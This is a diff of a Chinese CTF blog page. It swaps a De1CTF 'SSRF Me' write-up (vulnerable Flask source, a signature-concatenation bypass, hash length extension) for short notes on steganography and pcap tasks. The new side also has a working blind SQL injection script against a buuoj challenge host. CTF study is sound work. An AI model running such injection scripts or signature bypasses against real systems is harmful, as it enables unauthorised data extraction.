@@ -6,7 +6,7 @@
 <meta HTTP-EQUIV="pragma" CONTENT="no-cache"> 
 <meta HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate"> 
 <meta HTTP-EQUIV="expires" CONTENT="0"> 
-<title>[De1CTF 2019]SSRF Me(python代码审计) | 过客</title>	
+<title>2020/3/5日常划水~~~~ | 过客</title>	
 
 <link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
 <script type="text/javascript">
@@ -150,10 +150,10 @@ window.onload=getCSS();
 	
 	                      
 		<div class="entry-content">
-			<h1 class="wow swing entry-title">[De1CTF 2019]SSRF Me(python代码审计)</h1>
+			<h1 class="wow swing entry-title">2020/3/5日常划水~~~~</h1>
 <div class="entry-meta">
 <div class="wow bounce">
-	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-03-03 21:00:07" itemprop="datePublished" pubdate="">2020-03-03</time></i>
+	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-03-04 20:39:23" itemprop="datePublished" pubdate="">2020-03-04</time></i>
 	          </div>
 			
 </span>
@@ -161,166 +161,48 @@ window.onload=getCSS();
 		</div>
                   
 			<div class="wow slideInLeft entry-summary song">
-				<p>进去就有源码~</p>
-<!-- more -->
-<pre><code>#! /usr/bin/env python
-#encoding=utf-8
-from flask import Flask
-from flask import request
-import socket
-import hashlib
-import urllib
-import sys
-import os
-import json
-reload(sys)
-sys.setdefaultencoding('latin1')
+				<p><strong>[RoarCTF2019]黄金6年</strong><br>
+题目给了MP4。日常右键详细信息。hex查看<br>
+发现末尾有个base64<br>
+<img src="https://guokeya.github.io/post-images/1583325659598.png" alt="" loading="lazy"><br>
+是个rar。notepad++base64解码一下得到压缩包<br>
+需要密码。<br>
+尝试提取mp4.mp4隐写。慢慢看mp4.有四张二维码<br>
+<img src="https://guokeya.github.io/post-images/1583325750930.png" alt="" loading="lazy"><br>
+得到压缩密码。拿flag</p>
+<p><strong>john-in-the-middle</strong><br>
+得到一个流量包。就一些http请求。<br>
+<img src="https://guokeya.github.io/post-images/1583326169000.png" alt="" loading="lazy"><br>
+导出对象后。对各种文件一波操作<br>
+无脑flag<br>
+<img src="https://guokeya.github.io/post-images/1583326199877.png" alt="" loading="lazy"></p>
+<p><strong>[极客大挑战 2019]FinalSQL</strong><br>
+不想说了。。。。盲注脚本一跑就有。flag比较狗。不在fllllag表里</p>
+<pre><code>import requests
 
-app = Flask(__name__)
+url='http://ebb669c6-58d3-473c-ac3b-f99cfbb552cc.node3.buuoj.cn/search.php?id=1^'
 
-secert_key = os.urandom(16)
-
-
-class Task:
-    def __init__(self, action, param, sign, ip):
-        self.action = action
-        self.param = param
-        self.sign = sign
-        self.sandbox = md5(ip)
-        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
-            os.mkdir(self.sandbox)
-
-    def Exec(self):
-        result = {}
-        result['code'] = 500
-        if (self.checkSign()):
-            if &quot;scan&quot; in self.action:
-                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, 'w')
-                resp = scan(self.param)
-                if (resp == &quot;Connection Timeout&quot;):
-                    result['data'] = resp
-                else:
-                    print resp
-                    tmpfile.write(resp)
-                    tmpfile.close()
-                result['code'] = 200
-            if &quot;read&quot; in self.action:
-                f = open(&quot;./%s/result.txt&quot; % self.sandbox, 'r')
-                result['code'] = 200
-                result['data'] = f.read()
-            if result['code'] == 500:
-                result['data'] = &quot;Action Error&quot;
-        else:
-            result['code'] = 500
-            result['msg'] = &quot;Sign Error&quot;
-        return result
-
-    def checkSign(self):
-        if (getSign(self.action, self.param) == self.sign):
-            return True
-        else:
-            return False
-
-
-#generate Sign For Action Scan.
-@app.route(&quot;/geneSign&quot;, methods=['GET', 'POST'])
-def geneSign():
-    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
-    action = &quot;scan&quot;
-    return getSign(action, param)
-
-
-@app.route('/De1ta',methods=['GET','POST'])
-def challenge():
-    action = urllib.unquote(request.cookies.get(&quot;action&quot;))
-    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
-    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))
-    ip = request.remote_addr
-    if(waf(param)):
-        return &quot;No Hacker!!!!&quot;
-    task = Task(action, param, sign, ip)
-    return json.dumps(task.Exec())
-@app.route('/')
-def index():
-    return open(&quot;code.txt&quot;,&quot;r&quot;).read()
-
-
-def scan(param):
-    socket.setdefaulttimeout(1)
-    try:
-        return urllib.urlopen(param).read()[:50]
-    except:
-        return &quot;Connection Timeout&quot;
-
-
-
-def getSign(action, param):
-    return hashlib.md5(secert_key + param + action).hexdigest()
-
-
-def md5(content):
-    return hashlib.md5(content).hexdigest()
-
-
-def waf(param):
-    check=param.strip().lower()
-    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):
-        return True
-    else:
-        return False
-
-
-if __name__ == '__main__':
-    app.debug = False
-    app.run(host='0.0.0.0')
+for a in range(1,1000):
+    for b in range(30,130):
+        payload=&quot;(ord(substr((select(group_concat(password))from(F1naI1y)),&quot;+str(a)+&quot;,1))=&quot;+str(b)+&quot;)&quot;
+#(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),&quot;+str(a)+&quot;,1))=&quot;+str(b)+&quot;)
+        #print (url+payload)
+        r=requests.get(url=url+payload)
+        if 'ERROR！！！' in r.text:
+            print(chr(b))
+            break
 </code></pre>
-<p>python代码一般就是先看路由<br>
-这题有三个路由。<br>
-第一个路由就是显示源码<br>
-第二个路由是数据签名<br>
-暂时只知道它接受一个param参数。然后和密钥+'scan'组合md5<br>
-<img src="https://guokeya.github.io/post-images/1583241217552.png" alt="" loading="lazy"><br>
-三个路由是De1ta。应该是代码关键处<br>
-最后进入Task类中的EXEC函数<br>
-<img src="https://guokeya.github.io/post-images/1583241556947.png" alt="" loading="lazy"><br>
-进行签名验证。<br>
-<img src="https://guokeya.github.io/post-images/1583241800464.png" alt="" loading="lazy"><br>
-总结一下：</p>
-<pre><code>geneSign。输入param可以得到。此时一个参数可控
-md5(密钥+param+action)
-checksign。输入param/action/sign。注意。此时三个参数都可控
-md5(密钥+param+action)==sign
-Task.Exec。action中得包含scan和read。不然你scan读取了flag。怎么看。要么算md5(ip)沙箱名称。。我没成功
-
-从签名的两步中。密钥是不变的。而action定死为scan了
-可变的只有中间的param
-那么md5(密钥+flag.txtread+scan)是否等于md5(密钥+flag.txt+readscan)呢
-答案是肯定的。python直接将他们连接了起来。没有任何操作
-</code></pre>
-<p>答案显而易见。我们可以在geneSign处。将param设为flag.txtread。我们就可以得到md5(密钥+flag.txtread+scan)<br>
-在验证签名时。我们输入sign为之前获取的sign。param为flag.txt 。action为readscan<br>
-那么它验证签名的时候md5(密钥+flag.txt+readscan)是相等的<br>
-<img src="https://guokeya.github.io/post-images/1583243145083.png" alt="" loading="lazy"></p>
-<p>第二种解法。利用hashpump进行哈希扩展攻击<br>
-首先。去/geneSign。获取密钥+flag.txt+scan的md5<br>
-利用hash扩展攻击。在最后附加一个read<br>
-<img src="https://guokeya.github.io/post-images/1583281482179.png" alt="" loading="lazy"><br>
-<img src="https://guokeya.github.io/post-images/1583281548624.png" alt="" loading="lazy"></p>
 
 							</div>
 	<div class="wow bounceInDown vt-post-tags">
  
-				<a href="https://guokeya.github.io/tag/CTF/" rel="tag">CTF</a>	
-				 
 					</div>						
 <nav class="navigation3 post-navigation3" role="navigation">
 		
 		<div class="nav-links3">
       
-		<div class="wow bounceInLeft nav-previous3"><a href="https://guokeya.github.io/post/yWVl5z9kD/" rel="prev"> 2020/3/5日常划水~~~~</a></div>
 		 
-		 
-		<div class="wow bounceInRight nav-next3"><a href="https://guokeya.github.io/post/SxEyR_6MD/" rel="next"> 战队友链</a></div>
+		<div class="wow bounceInRight nav-next3"><a href="https://guokeya.github.io/post/3aEFZGLd6/" rel="next"> [De1CTF 2019]SSRF Me(python代码审计)</a></div>
 		
 		</div>
 	</nav>
